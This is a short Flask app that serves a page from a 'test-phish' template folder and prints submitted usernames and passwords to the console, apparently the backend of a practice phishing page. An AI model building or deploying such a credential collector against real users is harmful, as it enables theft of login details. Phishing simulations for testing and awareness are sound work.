from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        text = request.form['text']
        password = request.form['password']
        print("Username:", text)  
        print("Password:", password)  
    return render_template('test-phish/index.html')

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=8000)
